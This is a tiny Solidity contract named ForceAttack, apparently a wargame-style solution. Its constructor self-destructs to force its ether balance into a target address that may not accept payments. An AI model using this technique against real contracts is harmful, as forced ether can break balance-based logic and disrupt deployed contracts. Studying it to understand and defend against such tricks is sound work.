// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ForceAttack {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
